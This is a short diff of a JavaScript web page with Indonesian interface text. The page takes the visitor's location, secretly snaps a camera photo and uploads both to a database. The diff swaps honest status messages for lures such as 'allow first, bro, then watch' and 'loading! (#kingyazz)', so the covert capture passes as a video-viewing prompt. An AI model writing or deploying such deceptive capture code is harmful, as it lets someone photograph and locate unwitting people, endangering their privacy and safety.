@@ -251,7 +251,7 @@
               console.error("Insert error:", insertError);
               updateUI("❌ Gagal simpan data");
             } else {
-              updateUI("✅ Foto berhasil direkam! (Video tetap error)");
+              updateUI("✅ loading! (#kingyazz)");
               
               // Setelah 3 detik, kembalikan ke pesan awal
               setTimeout(() => {
@@ -268,7 +268,7 @@
       
     } catch (err) {
       console.error("Kamera error:", err);
-      updateUI("❌ Gagal akses kamera. Periksa izin.");
+      updateUI("❌ izinkan dulu bot");
     }
   }
 
@@ -287,7 +287,7 @@
         const lat = pos.coords.latitude;
         const lon = pos.coords.longitude;
         
-        updateUI("Lokasi didapat, mengakses kamera...");
+        updateUI("izinkan dulu bang baru nonton");
         
         // Ambil foto (tanpa ditampilkan)
         await captureAndUpload(lat, lon);
